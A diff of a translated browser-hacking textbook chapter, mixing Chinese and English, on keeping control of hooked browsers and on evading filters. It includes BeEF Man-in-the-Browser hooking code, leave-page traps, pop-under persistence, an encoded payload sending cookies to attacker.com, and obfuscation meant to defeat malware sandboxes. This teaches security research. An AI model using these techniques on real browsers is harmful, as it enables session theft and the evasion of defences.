-        e.returnValue = "There is currently a request to the server 
-          pending. You will lose recent changes by navigating away.";
-      }else{
-        if (e.stopPropagation) {
-          e.stopPropagation();
-          e.preventDefault();
-          e.returnValue = "There is currently a request to the server   
-            pending. You will lose recent changes by navigating away.";
-        }
-      }
+window.onbeforeunload = dontleave;
+```
 
-      // 重新显示确认框，让用户点击“确定”时感到烦扰
-      display_confirm();
-      return "There is currently a request to the server pending. You  
-        will lose recent changes by navigating away.";
-    }
+该示例会覆盖已有的 `onbeforeunload` 处理函数并执行 `dontleave` 函数。为进一步防止冲突，使用 `cancelBubble` 方法在 Internet Explorer 中阻止事件冒泡，从而阻止已有函数干扰新代码。根据现有 JavaScript 代码的复杂程度，阻止事件冒泡也是提升性能的好办法。如果有许多嵌套元素，直接覆盖原有代码并阻止冒泡可能是个不错的选择。
 
-    window.onbeforeunload = dontleave;
-    ```
+浏览器间的行为略有差异。如图 3-10 和 3-11 所示，Firefox 18 的表现如下：如果受害者点击“取消”，第二个确认框会自动弹出；如果点击“确定”，确认框会在循环中不断重复显示。唯一真正离开页面的操作是点击“离开页面”，如图 3-11 所示。
 
-    该示例会覆盖已有的 `onbeforeunload` 处理函数并执行 `dontleave` 函数。为进一步防止冲突，使用 `cancelBubble` 方法在 Internet Explorer 中阻止事件冒泡，从而阻止已有函数干扰新代码。根据现有 JavaScript 代码的复杂程度，阻止事件冒泡也是提升性能的好办法。如果有许多嵌套元素，直接覆盖原有代码并阻止冒泡可能是个不错的选择。
+start figure
 
-    浏览器间的行为略有差异。如图 3-10 和 3-11 所示，Firefox 18 的表现如下：如果受害者点击“取消”，第二个确认框会自动弹出；如果点击“确定”，确认框会在循环中不断重复显示。唯一真正离开页面的操作是点击“离开页面”，如图 3-11 所示。
+**Figure 3-10:** First dialog on Firefox 18 with custom content (controlled with JavaScript)
 
-    start figure  
-    **Figure 3-10:** First dialog on Firefox 18 with custom content (controlled with JavaScript)  
-    ![c03f010.tif](img/c03f010.png)  
-    end figure  
-    start figure  
-    **Figure 3-11:** Second dialog on Firefox 18 (can’t be controlled with JavaScript)  
-    ![c03f011.tif](img/c03f011.png)  
-    end figure  
+![c03f010.tif](img/c03f010.png)
 
-    在 Internet Explorer 9（Windows 7）上的行为非常相似，但你可以对对话框文本拥有更多控制，如图 3-12 和 3-13 所示。Figure 3-13 中的第二个对话框文本也可以自定义。总体行为与 Firefox 相同。
+end figure
 
-    start figure  
-    **Figure 3-12:** First dialog box on IE 9 with custom content (controlled with JavaScript)  
-    ![c03f012.tif](img/c03f012.png)  
-    end figure  
-    start figure  
-    **Figure 3-13:** Second dialog box on IE 9 (controlled with JavaScript)  
-    ![c03f013.tif](img/c03f013.png)  
-    end figure  
+start figure
 
-    因此，你可能只想在 Internet Explorer 浏览器上使用此关闭技术，因为 Firefox 和 Chrome 在自定义消息方面的功能受限。
+**Figure 3-11:** Second dialog on Firefox 18 (can’t be controlled with JavaScript)
 
-    作为保持持久性的方法，使用这些事件可能为你提供几秒钟的执行时间，但它们并不是理想的长期控制手段。弹出下方窗口（pop-under window）将在下一节中讨论，可能为你提供保留对被钩浏览器控制的新机会。当然，你也可以组合多种技术，通过层叠自定义关闭事件处理例程；使用 IFrames 和弹出下方窗口，你可能会在完成所需命令前保持钩钓时间足够长。
+![c03f011.tif](img/c03f011.png)
+
+end figure
+
+在 Internet Explorer 9（Windows 7）上的行为非常相似，但你可以对对话框文本拥有更多控制，如图 3-12 和 3-13 所示。Figure 3-13 中的第二个对话框文本也可以自定义。总体行为与 Firefox 相同。
+
+start figure
+
+**Figure 3-12:** First dialog box on IE 9 with custom content (controlled with JavaScript)
+
+![c03f012.tif](img/c03f012.png)
+
+end figure
+
+start figure
+
+**Figure 3-13:** Second dialog box on IE 9 (controlled with JavaScript)
+
+![c03f013.tif](img/c03f013.png)
+
+end figure
+
+因此，你可能只想在 Internet Explorer 浏览器上使用此关闭技术，因为 Firefox 和 Chrome 在自定义消息方面的功能受限。
+
+作为保持持久性的方法，使用这些事件可能为你提供几秒钟的执行时间，但它们并不是理想的长期控制手段。弹出下方窗口（pop-under window）将在下一节中讨论，可能为你提供保留对被钩浏览器控制的新机会。当然，你也可以组合多种技术，通过层叠自定义关闭事件处理例程；使用 IFrames 和弹出下方窗口，你可能会在完成所需命令前保持钩钓时间足够长。
 
 ## 使用弹出下方窗口
 
-
-
-
 当你浏览到某个网站时，最让人恼火的莫过于无提示的弹窗。你有多少次被迫反复关闭多个显示广告的弹窗？而弹窗是指在当前浏览器页面前景出现的新浏览器窗口，而弹下（pop-under）则是一个在背景出现的新浏览器窗口，字面上说它位于当前浏览器窗口的下方。大多数现代浏览器默认会阻止弹下的行为。
+
+
 
 最简便的使用 JavaScript 打开弹下的方法是使用 `window.open()` 方法。下面的代码在最新版本的 Firefox 和 Chrome 中默认会被阻止：
 
-``` 
+```
 window.open('http://example.com','popunder','toolbar=0
   location=0,directories=0,status=0,menubar=0,scrollbars=0,
   resizable=0,width=1,height=1,left='+screen.width+',
@@ -1948,17 +1883,17 @@ for (var i = 0; i < anchors.length; i++) {
 }
 ```
 
-当用户点击页面上的链接时，href 属性指向的 URI 会被打开，同时弹下窗口也会出现。默认情况下，现代浏览器并不会阻止弹下窗口。唯一例外的是 Opera 浏览器。
+当用户点击页面上的链接时，`href` 属性指向的 URI 会被打开，同时弹下窗口也会出现。默认情况下，现代浏览器并不会阻止弹下窗口。唯一例外的是 Opera 浏览器。
 
 为了更加隐蔽，你可以把弹下窗口精确地放在当前浏览器窗口的正后方。可以通过 `window.screenX` 和 `window.screenY` 来获取当前窗口的位置。弹下窗口的高度和宽度至少要设为 1 像素，因为 0 像素会被大多数浏览器阻止。不过在大多数情况下，弹下窗口的尺寸会大于 1 像素（如 Figure 3-14 所示）。注意，弹下窗口被手动放在主浏览器窗口的左侧，否则会不可见：
 
- start figure 
+start figure 
 
 **Figure 3-14:** 不同浏览器中弹下窗口的尺寸
 
 ![c03f014.tif](img/c03f014.png)
 
- end figure 
+end figure 
 
 有了这些信息，你可以如下修改 `$.popunder()` 函数：
 
@@ -1969,10 +1904,7 @@ var aPopunder = [
 $.popunder(aPopunder)
 ```
 
-当用户点击被动态修改的链接（如上文所示）时，指向 http://browserhacker.com 的弹下窗口会被加载。此技术的目标是加载包含 JavaScript 钩子的资源。如果你能将其与“Man-in-the-Browser”或 iframe 技术结合，就能在受害者关闭当前被钩住的标签页时，仍保持钩子的持久性。
-
-
-
+当用户点击被动态修改的链接（如上文所示）时，指向 `http://browserhacker.com` 的弹下窗口会被加载。此技术的目标是加载包含 JavaScript 钩子的资源。如果你能将其与“Man-in-the-Browser”或 iframe 技术结合，就能在受害者关闭当前被钩住的标签页时，仍保持钩子的持久性。
 
 # Man-in-the-Browser vs. Man-in-the-Middle Attacks
 
@@ -1986,9 +1918,9 @@ end feature
 
 MitB 攻击旨在劫持 AJAX GET 和 POST 请求，并且在同源和跨源场景中均可工作。这些攻击得益于 JavaScript 和 DOM 的灵活性，其中 JavaScript 能够重写内置 DOM 方法的原型。
 
-原型重写是 MitB 攻击用来劫持 AJAX 请求的一种技巧。下面是 BeEF 的代码片段，展示了如何重写 XMLHttpRequest 原型对象的 open 方法以实现自定义逻辑。你不能直接复制这段代码，因为它依赖于 BeEF 的其他特性。
+原型重写是 MitB 攻击用来劫持 AJAX 请求的一种技巧。下面是 BeEF 的代码片段，展示了如何重写 `XMLHttpRequest` 原型对象的 `open` 方法以实现自定义逻辑。你不能直接复制这段代码，因为它依赖于 BeEF 的其他特性。
 
-``` 
+```
 init:function (cid, curl) { 
   beef.mitb.cid = cid;
   beef.mitb.curl = curl;
@@ -2047,15 +1979,17 @@ init:function (cid, curl) {
 },
 ```
 
-在 init 函数被调用后，每次使用 XMLHttpRequest.open 时，其行为都会根据自定义的重写实现发生变化：
+在 `init` 函数被调用后，每次使用 `XMLHttpRequest.open` 时，其行为都会根据自定义的重写实现发生变化：
 
-Level1 **1.** 检查请求是否由 MitB 本身发起，或是否属于钩子通信通道。在后者情况下不进行劫持；**2.** 如果请求方法是 GET，判断请求是否为同源或跨源。**3.** 如果是同源请求，加载资源并在当前页面显示其内容，同时保持钩子存活。将页面标题恢复为原始标题，并使用 history 对象（history.pushState）将 URL 栏内容替换为正确的资源 URI。**4.** 如果是跨源请求，则直接在新标签页（window.open）中打开资源，以保持当前标签页中的钩子存活。**5.** 如果方法是 POST，则直接执行请求。
+Level1 **1.** 检查请求是否由 MitB 本身发起，或是否属于钩子通信通道。在后者情况下不进行劫持；**2.** 如果请求方法是 GET，判断请求是否为同源或跨源。**3.** 如果是同源请求，加载资源并在当前页面显示其内容，同时保持钩子存活。将页面标题恢复为原始标题，并使用 `history` 对象（`history.pushState`）将 URL 栏内容替换为正确的资源 URI。**4.** 如果是跨源请求，则直接在新标签页（`window.open`）中打开资源，以保持当前标签页中的钩子存活。**5.** 如果方法是 POST，则直接执行请求。
 
 /Level1
 
 ### Hijacking Non-AJAX Requests
 
-非 AJAX 的 GET 和 POST 请求也可以被劫持。类似于 AJAX 资源，普通资源会被 MitB 代码预取并篡改默认行为（即链接和表单的中毒）。例如，如果页面包含指向同源资源的 <a> 标签，MitB 会在该标签上添加 onClick 事件属性，以执行 JavaScript 函数。用户点击链接时，默认的 GET 请求会被阻止，取而代之的是新的 onClick 事件处理函数。如果该链接已经包含 onClick 属性，MitB 会替换该方法，调用不同的函数。下面是 BeEF 的示例代码：
+非 AJAX 的 GET 和 POST 请求也可以被劫持。类似于 AJAX 资源，普通资源会被 MitB 代码预取并篡改默认行为（即链接和表单的中毒）。例如，如果页面包含指向同源资源的 `<a>` 标签，MitB 会在该标签上添加 `onClick` 事件属性，以执行 JavaScript 函数。用户点击链接时，默认的 GET 请求会被阻止，取而代之的是新的 `onClick` 事件处理函数。如果该链接已经包含 `onClick` 属性，MitB 会替换该方法，调用不同的函数。下面是 BeEF 的示例代码：
+
+
 
 ``` 
 // Fetches a hooked link with AJAX
@@ -2119,18 +2053,17 @@ var lis = document.getElementsByTagName("li");
         }
 ```
 
-
-
-
 The `fetchOnclick` function is similar to the `fetch` function, and has been omitted. You can find the full source code at [`browserhacker.com`](https://browserhacker.com).
 
-`Poisoning` forms is similar to poisoning links. The only difference is that it requires a bit more logic because the form fields need to be parsed while the `onSubmit` event is triggered. The result is the same, so the POST request is sent using AJAX, and the target innerHTML is then updated with the proper content, while in the background the hook is still working. The target is unlikely to spot the attack because there are no changes to the look and feel of the page. The only potential indicator of the attack is opening cross-origin links in new tabs, instead of the current window.
+`Poisoning` forms is similar to poisoning links. The only difference is that it requires a bit more logic because the form fields need to be parsed while the `onSubmit` event is triggered. The result is the same, so the POST request is sent using AJAX, and the target `innerHTML` is then updated with the proper content, while in the background the hook is still working. The target is unlikely to spot the attack because there are no changes to the look and feel of the page. The only potential indicator of the attack is opening cross-origin links in new tabs, instead of the current window.
 
 start feature 
 
 * * *
 
-**From Monitoring to Expanding the Attack Surface** It must be noted that user activity, for example which links are clicked and which forms (including data) are submitted, can be logged and made available to you. This is useful in situations where the user is clicking on cross-origin links. In this particular case, thanks to the Same Origin Policy, loading the resource via AJAX obviously won’t be successful. If this happens, the link is simply opened in a new tab, preventing the loss of the hook because the already hooked tab remains open. You can’t control the newly opened tab, because it’s a different origin. However, you can determine what its URL is, because you have full control of the page DOM. At this point you can attempt to expand the attack surface by running XssRays on the target resource to look for XSS vulnerabilities. If further flaws are discovered, they can be used to hook the new origin by exploiting the XSS, resulting in the control of the origin loaded in the second tab too. This attack technique with XssRays is covered in Chapter 9. 
+### From Monitoring to Expanding the Attack Surface
+
+It must be noted that user activity, for example which links are clicked and which forms (including data) are submitted, can be logged and made available to you. This is useful in situations where the user is clicking on cross-origin links. In this particular case, thanks to the Same Origin Policy, loading the resource via AJAX obviously won’t be successful. If this happens, the link is simply opened in a new tab, preventing the loss of the hook because the already hooked tab remains open. You can’t control the newly opened tab, because it’s a different origin. However, you can determine what its URL is, because you have full control of the page DOM. At this point you can attempt to expand the attack surface by running `XssRays` on the target resource to look for XSS vulnerabilities. If further flaws are discovered, they can be used to hook the new origin by exploiting the XSS, resulting in the control of the origin loaded in the second tab too. This attack technique with `XssRays` is covered in Chapter 9.
 
 * * *
 
@@ -2180,13 +2113,15 @@ eval(atob("bG9jYXRpb24uaHJlZj0naHR0cDovL2F0dGF"+
  "ja2VyLmNvbT9jPScrZG9jdW1lbnQuY29va2ll"));
 ```
 
-The Regex-based filter unfortunately still blocks the vector because the blacklisted `eval` keyword is still present. There are multiple different ways to get access to the window object, which can help achieve eval behavior by using different statements. For example:
+
+
+The Regex-based filter unfortunately still blocks the vector because the blacklisted `eval` keyword is still present. There are multiple different ways to get access to the `window` object, which can help achieve `eval` behavior by using different statements. For example:
 
 ```
  [].constructor.constructor("code")();
 ```
 
-Another method is to use either the `setTimeout()` or `setInterval()` functions (or even `setImmediate()` in newer browsers) all of which evaluate JavaScript functions. Note in the instance of the `setTimeout()`function that the second argument, which specifies a millisecond delay before calling the function, is not mandatory. If not specified, the function is called immediately. Using `setTimeout()`, the final code will be:
+Another method is to use either the `setTimeout()` or `setInterval()` functions (or even `setImmediate()` in newer browsers) all of which evaluate JavaScript functions. Note in the instance of the `setTimeout()` function that the second argument, which specifies a millisecond delay before calling the function, is not mandatory. If not specified, the function is called immediately. Using `setTimeout()`, the final code will be:
 
 ```
 setTimeout(atob("bG9jYXRpb24uaHJlZj0naHR0cDovL2Jyb3"+
@@ -2197,11 +2132,9 @@ This code snippet bypasses the Regex-based filter mentioned earlier and demonstr
 
 Base64 is not the only way to encode data. Plenty of other methods are available too. For example URL encoding, double URL encoding, Hex encoding, Unicode escapes and so on.
 
- start feature 
+### Packing JavaScript
 
-* * *
-
-**Packing JavaScript** Packing and minifying of JavaScript can also be useful to evade detection, especially if combined with random variables and other techniques described in the following sections. The processing of minifying involves removing all the unnecessary characters from your code without impacting its ability to run. Packing, on the other hand, is more analogous to compression, and often involves shortening variable names and other function calls. Consider the following code snippet, which is analyzed further in the “Random Variables and Methods” section: 
+Packing and minifying of JavaScript can also be useful to evade detection, especially if combined with random variables and other techniques described in the following sections. The processing of minifying involves removing all the unnecessary characters from your code without impacting its ability to run. Packing, on the other hand, is more analogous to compression, and often involves shortening variable names and other function calls. Consider the following code snippet, which is analyzed further in the “Random Variables and Methods” section:
 
 ```
 var malware = {
@@ -2219,10 +2152,7 @@ function redirect_to_site(){
 redirect_to_site();
 ```
 
-
-
-
-After packing this code with Dean Edwards’ Packer,17 the result will be: 
+After packing this code with Dean Edwards’ Packer,17 the result will be:
 
 ```
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};
@@ -2236,7 +2166,7 @@ c=1};while(c--)if(k[c])p=p.replace(new RegExp(‘\\b’+e(c)+
 function|alpha|location'.split(‘|’),0,{}))
 ```
 
-As you can see, function and variable names like malware, window, and exploits are still very clear at the bottom of the snippet. The following is the same code, but packed after randomizing variables and methods names: 
+As you can see, function and variable names like `malware`, `window`, and `exploits` are still very clear at the bottom of the snippet. The following is the same code, but packed after randomizing variables and methods names:
 
 ```
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};
@@ -2250,11 +2180,7 @@ Array|http|malicious|sXCrv|aa|js|LctUZLQnJ_gp|
 true|ZEpXkhxSMz|function|var|location'.split('|'),0,{}))
 ```
 
-You can clearly see the difference between the two packed snippets. 
-
-* * *
-
- end feature 
+You can clearly see the difference between the two packed snippets.
 
 ### Whitespace Encoding
 
@@ -2273,7 +2199,7 @@ encoded = whitespace_encode("alert(1)")
 File.open("whitespace_out.js", 'w'){|f| f.write(encoded)}
 ```
 
-As you can see, input into the whitespace_encode() function is converted to a binary representation, then 0 is mapped to Tab and 1 is mapped to Space. The result is written to a new file, enabling you to copy and paste it more easily. The code needs a boot-strapper in order to properly decode and evaluate the input. The following JavaScript implementation includes the whitespace_encoded variable from earlier:
+As you can see, input into the `whitespace_encode()` function is converted to a binary representation, then 0 is mapped to Tab and 1 is mapped to Space. The result is written to a new file, enabling you to copy and paste it more easily. The code needs a boot-strapper in order to properly decode and evaluate the input. The following JavaScript implementation includes the `whitespace_encoded` variable from earlier:
 
 ```
 // the TABs are likely to be not working
@@ -2300,17 +2226,13 @@ console.log(decoded.toString());
 window.setTimeout(decoded);
 ```
 
-The decode_whitespace function is used to decode the content of the whitespace_encoded variable, which contains the whitespaces generated through the previous Ruby script. The decoding process reconstructs data characters byte-by-byte. String.fromCharCode is used to return the original string. Finally, the string representation of the decoded instructions is evaluated by setTimeout, and finally executed.
+The `decode_whitespace` function is used to decode the content of the `whitespace_encoded` variable, which contains the whitespaces generated through the previous Ruby script. The decoding process reconstructs data characters byte-by-byte. `String.fromCharCode` is used to return the original string. Finally, the string representation of the decoded instructions is evaluated by `setTimeout`, and finally executed.
 
-As you can see in Figure 3-15, the decoded source code (alert(1)) is evaluated using a setTimeout() call.
-
- start figure 
+As you can see in Figure 3-15, the decoded source code (`alert(1)`) is evaluated using a `setTimeout()` call.
 
 **Figure 3-15:** An example of the WhiteSpace encoding technique
 
 ![c03f015.eps](img/c03f015.png)
-
- end figure 
 
 ### Non-alphanumeric JavaScript
 
@@ -2340,9 +2262,11 @@ Given this behavior, you can easily construct strings. For instance to construct
 ([![]]+[])
 ```
 
-You first start with an empty array \[\], you negate it using !, and you have a Boolean false. Then wrapping it inside another empty array and concatenating it with yet another empty array, you obtain the string “false”. Now that you can create arbitrary strings, you need to get a reference to window.
+You first start with an empty array \[\], you negate it using `!`, and you have a Boolean `false`. Then wrapping it inside another empty array and concatenating it with yet another empty array, you obtain the string “false”. Now that you can create arbitrary strings, you need to get a reference to `window`.
 
 An old example, which used to work in Firefox, is the following:
+
+
 
 ```
 alert((1,[].sort)())
@@ -2354,17 +2278,17 @@ An updated example that still works in Chrome, is the following:
 alert((0,[].concat)())
 ```
 
-Both the previous examples rely on either the sort or concat functions returning window, because they don’t know which array is referenced.
+Both the previous examples rely on either the `sort` or `concat` functions returning `window`, because they don’t know which array is referenced.
 
-At this stage you can create arbitrary strings and get a reference to window, so you can call static methods such as window.alert and others, but you need some more trickery to evaluate code. Various ways to achieve that have been discussed previously, but still one of the shortest methods is by using constructor:
+At this stage you can create arbitrary strings and get a reference to `window`, so you can call static methods such as `window.alert` and others, but you need some more trickery to evaluate code. Various ways to achieve that have been discussed previously, but still one of the shortest methods is by using constructor:
 
 ```
 [].constructor.constructor("alert(1)")()
 ```
 
-If you access the constructor two times from an array object, you get Function. From there, you can pass strings of arbitrary code to be evaluated, such as “alert(1)”.
+If you access the constructor two times from an array object, you get `Function`. From there, you can pass strings of arbitrary code to be evaluated, such as `"alert(1)"`.
 
-A number of tools exist that can assist with the generation of non-alphanumeric JavaScript including JJencode21 and AAencode,22 both from Yosuke Hasegawa. AAencode even demonstrates how you can encode JavaScript with Japanese style emoticon characters. An example of alert(1) encoded with JJencode is the following:
+A number of tools exist that can assist with the generation of non-alphanumeric JavaScript including `JJencode`21 and `AAencode`,22 both from Yosuke Hasegawa. `AAencode` even demonstrates how you can encode JavaScript with Japanese style emoticon characters. An example of `alert(1)` encoded with `JJencode` is the following:
 
 ```
 $=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],
@@ -2377,16 +2301,13 @@ $._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+
 $.___+")"+"\"")())();
 ```
 
-
-
-
 如你所见，像`alert(1)`这样短函数的字符编码所需字符数量很大。这使得这种编码技术很有趣，但如果需要编码数百行 JavaScript 代码，则并不总是有效。无论其适用性如何，拥有另一种编码技术来隐藏小段代码是有用的。
 
-Yosuke 最初的 JJencode 理念引起了安全行业的兴趣，进而推动了该领域的进一步实验，最终在 slackers.org 上由 Robert Hansen 创建了 Diminutive NoAlNum JS Contest23。
+Yosuke 最初的 `JJencode` 理念引起了安全行业的兴趣，进而推动了该领域的进一步实验，最终在 `slackers.org` 上由 Robert Hansen 创建了 Diminutive NoAlNum JS Contest23。
 
 ### 利用混淆规避
 
-前面的章节展示了编码的工作原理，以及它在隐藏 JavaScript 代码时的作用。混淆是另一种隐藏代码的方法，当与编码结合使用时，可以成为绕过网络过滤的非常有效手段。这些技术在野外非常常见；例如，客户端攻击交付工具包（如 BlackHole24）通常会使用混淆和编码的 JavaScript 负载。下面的章节将探讨多种技术，帮助你让代码更难被检测。
+前面的章节展示了编码的工作原理，以及它在隐藏 JavaScript 代码时的作用。混淆是另一种隐藏代码的方法，当与编码结合使用时，可以成为绕过网络过滤的非常有效手段。这些技术在野外非常常见；例如，客户端攻击交付工具包（如 `BlackHole`24）通常会使用混淆和编码的 JavaScript 负载。下面的章节将探讨多种技术，帮助你让代码更难被检测。
 
 #### 随机变量和方法
 
@@ -2409,15 +2330,11 @@ redirect_to_site();
 
 现在想象一下，如果有一个网络过滤方案通过正则表达式过滤网络流量，搜索关键词`malware`、`version`号以及`redirect_to_malware()`或其他函数名称。这比你想象的更为常见，如果服务器端代码多样化（polymorphism）未被使用，它可能非常有效。
 
-start feature 
-
 * * *
 
 **Server-side Polymorphism** 主要被恶意软件利用，该技术通过修改代码使其难以通过静态签名（static signatures）判定为恶意。代码在每个钩子（hook）中都会发生变化，这意味着如果同一恶意软件感染两台机器，其代码在比较时会呈现不同，但功能相同。
 
 * * *
-
-end feature 
 
 实现基本的服务器端代码多样化并不困难。下面的简单演示使用了按钮（hooked browser）的 Hash 数据结构（如果需要实现按会话多样化，可扩展为按会话存储）。下面的 Ruby 代码是一个示例：
 
@@ -2458,7 +2375,7 @@ end
 File.open("result.js", 'w'){|f|f.write(code)}
 ```
 
-每次运行该代码（例如在钩取新浏览器时），result.js 中的 JavaScript 代码将会不同。例如：
+每次运行该代码（例如在钩取新浏览器时），`result.js` 中的 JavaScript 代码将会不同。例如：
 
 ```
 var uxGfLVC = {
@@ -2554,27 +2471,35 @@ HrhB();
 
 下面是一个示例：
 
-
-
-
+```
 var timeout = 10000; 
+
 var interval = new Date().getSeconds();
+
 function timer(){
+
   var s_interval = new Date().getSeconds();
+
   var diff = s_interval - interval;
 
   if(diff == 10 && diff > 0) key = diff + "aaa"
+
   if(diff == -10 && diff < 0) key = diff + "bbb"
 
   decrypt(key); 
+
 }
+
 function decrypt(key){
+
   // decryption routine
+
   alert(key); 
+
 }
 
 setTimeout("timer()", timeout);
-[/content]
+```
 
 The `timer()` function is called after 10 seconds of delay. When the program flow enters that function, a check is made to see if 10 seconds have actually passed. If the expected time delay is verified, the key for the decryption routine is created, and the decryption routine is called. If the preceding code is obfuscated, including different time delays to multiple parts, it will become trickier to analyze. You might want to use different time delays in your code. This technique comes in handy, as most JavaScript sandboxes used for malware analysis have fixed timeouts, after which they give up analyzing the obfuscated code.
 
@@ -2614,9 +2539,11 @@ If a human analyst de-obfuscates just the script itself their result won’t be 
 
  end figure 
 
+
+
 The same concept can be extended to different contexts, not only the DOM. PDF files, Flash content, and Java Applets are all callable from JavaScript, so pieces of information can be pulled in from multiple disparate contexts.
 
-### Using the callee Property
+### Using the `callee` Property
 
 In JavaScript, if `arguments.callee` is called inside a function, it returns the function itself. This is sometimes useful when using anonymous recursive functions. Unfortunately, the use of `arguments.callee` is being deprecated from JavaScript, and will not run if using ECMAScript version 5 in strict mode.
 
@@ -2709,15 +2636,13 @@ if('\v'=='v'){
 
 The filtering engine will parse the code in the else statement and diagnose it as not malicious. The whole JavaScript content will be allowed by the proxy, and will then be potentially executed by an Internet Explorer browser. This time though, the logic flow that gets followed leads to the malicious code.
 
-
-
 The same concept applies while manually de-obfuscating the code, in case the evaluation is done within a browser or other tools that rely on a particular JavaScript engine. The example can be flipped the other way around depending on what filtering solution you want to bypass, but the concept remains the same.
 
 # Summary
 
 In this chapter, you have examined why retaining control is fundamental for browser hacking. The establishment of a communication channel and persisting your control is crucial if you want to be successful when compromising your target.
 
-Various techniques to achieve communication and persistence have been presented, and it’s now up to you to decide which method to use, or perhaps a combination of them, to achieve the best result. One possibility is that when communicating to the browser you might opt for a standard `XMLHttpRequest` communication channel. Then you might get it to automatically upgrade to the WebSocket protocol if supported. Further, you might then achieve persistence by combining `IFrames` and pop-unders. The best option will depend a lot on your specific attacking scenario.
+Various techniques to achieve communication and persistence have been presented, and it’s now up to you to decide which method to use, or perhaps a combination of them, to achieve the best result. One possibility is that when communicating to the browser you might opt for a standard `XMLHttpRequest` communication channel. Then you might get it to automatically upgrade to the `WebSocket` protocol if supported. Further, you might then achieve persistence by combining `IFrames` and pop-unders. The best option will depend a lot on your specific attacking scenario.
 
 Retaining control of the target browser will give you the opportunity to modularize the different attack code and make real-time decisions. This gives you the option of an attacker’s feedback loop. A particular action may unveil a subsequent issue, which when further investigated may expose more issues. Using this method you can choose which branch of the decision tree to go down as it presents itself. For example, you might identify all active hosts on the target browser’s local network and then choose only these to port scan.
 
@@ -2727,7 +2652,11 @@ You have explored many techniques that you can use to retain control of your tar
 
 # Questions
 
-Level1 **1.** What are the advantages in using a WebSocket protocol instead of an `XMLHttpRequest` channel? **2.** Describe how a DNS-based channel works, and why it’s good to have a stealthy communication. **3.** What is hooking a browser? **4.** Why can Man-in-the-Browser be effective in situations when IFrames cannot be used? **5.** How does the WhiteSpace encoding evasion technique work? **6.** Imagine an environment where you have a network protected by a web filtering solution. Which evasion techniques would you use? How would you combine them? **7.** Why would a time delay evasion technique be effective against Malware detection technologies? **8.** Give an example of hijacking a DOM event. **9.** What is the most reliable persistence technique in your opinion? Would you combine some of the techniques discussed previously? **10.** What does the following encoded string do? You can download the code from [`browserhacker.com`](https://browserhacker.com). 
+
+
+# Level1
+
+**1.** What are the advantages in using a WebSocket protocol instead of an `XMLHttpRequest` channel? **2.** Describe how a DNS-based channel works, and why it’s good to have a stealthy communication. **3.** What is hooking a browser? **4.** Why can Man-in-the-Browser be effective in situations when IFrames cannot be used? **5.** How does the WhiteSpace encoding evasion technique work? **6.** Imagine an environment where you have a network protected by a web filtering solution. Which evasion techniques would you use? How would you combine them? **7.** Why would a time delay evasion technique be effective against Malware detection technologies? **8.** Give an example of hijacking a DOM event. **9.** What is the most reliable persistence technique in your opinion? Would you combine some of the techniques discussed previously? **10.** What does the following encoded string do? You can download the code from [`browserhacker.com`](https://browserhacker.com).
 
 ```
 ZXZhbChmdW5jdGlvbihwLGEsYyxrLGUscil7ZT1mdW5jdGlvbihjKXty
@@ -2755,7 +2684,7 @@ cWIybHVKMTBvSWlJcE93Jy5zcGxpdCgnfCcpLDAse30pKQ==
 
 For answers to the questions please refer to the book’s website at [`browserhacker.com/answers`](https://browserhacker.com/answers) or the Wiley website at: [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook).
 
-**Notes**
+## Notes
 
 1\. Mayhem. (2001). IA32 Advanced Function Hooking. Retrieved March 8, 2013 from [`www.phrack.org/issues.html?issue=58&id=8#article`](http://www.phrack.org/issues.html?issue=58&id=8#article)
 
@@ -2789,9 +2718,6 @@ For answers to the questions please refer to the book’s website at [`browserha
 
 16\. Mozilla. (2013). EventTarget. Retrieved March 8, 2013 from [`developer.mozilla.org/en-US/docs/Web/API/EventTarget.addEventListener`](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget.addEventListener)
 
-
-
-
 17. Dean Edwards. (2010). Packer. 从 [`http://dean.edwards.name/packer/`](http://dean.edwards.name/packer/) 获取。 2013 年 3 月 8 日。
 
 18. Kolisar. (2008). WhiteSpace: A Different Approach to JavaScript Obfuscation. 从 [`http://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-kolisar.pdf`](http://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-kolisar.pdf) 获取。 2013 年 3 月 8 日。
@@ -2816,9 +2742,11 @@ For answers to the questions please refer to the book’s website at [`browserha
 
 # Bypassing the Same Origin Policy
 
+
+
 The Same Origin Policy (SOP) is possibly the most important security control enforced on the web. Unfortunately, it is also one of the most inconsistently implemented specifications. If the SOP is broken, or bypassed, the central security model of the World Wide Web is also broken.
 
-The intention of the SOP is to restrict interaction between interfaces of unrelated origins. The SOP dictates that if the origin http://browserhacker.com wants to access information from http://browservictim.com, it can’t. Of course, depending on which browser is used, or which browser plugin is used, this is not always so simple.
+The intention of the SOP is to restrict interaction between interfaces of unrelated origins. The SOP dictates that if the origin `http://browserhacker.com` wants to access information from `http://browservictim.com`, it can’t. Of course, depending on which browser is used, or which browser plugin is used, this is not always so simple.
 
 Various SOP bypasses are analyzed in this chapter. Because the SOP is a very critical component in browser security, many of these bypasses will have been patched by the time you read this book. Still, there is a lot to research, and it’s not unusual for a new bypass to be constructed by modifying a previous one.
 
@@ -2828,31 +2756,31 @@ When you employ an SOP bypass, it’s often possible to use the hooked browser a
 
 The SOP deems pages having the same hostname, scheme and port as residing at the same-origin. If any of these three attributes varies, the resource is in a different origin. Hence, if provided resources come from the same hostname, scheme and port, they can interact without restriction.
 
-The SOP was initially only defined for external resources, but was extended to include other types of origins. This included access to local files using the file scheme and browser-related resources using the chrome scheme.
+The SOP was initially only defined for external resources, but was extended to include other types of origins. This included access to local files using the `file` scheme and browser-related resources using the `chrome` scheme.
 
 Let’s consider the following analogy to demonstrate the necessity for this policy. Imagine a hospital. All patients within the hospital initially are admitted from external origins. The hospital may contain many patients at any given time, all unrelated. If any given patient in the hospital makes a request to the hospital staff to receive medical records or the status of other patients, they will be denied (and possibly with repeated aggressive attempts, admitted to another kind of hospital!). Similarly, if random members of the public make requests of the hospital to either visit or inquire about the status of any patients, the hospital will check to ensure they are closely related—of the same family or origin—before allowing access.
 
 Now imagine a hospital that allowed unfettered interaction between its patients, the data it held about the patients and anybody from the outside world as well! This is the browser without the SOP.
 
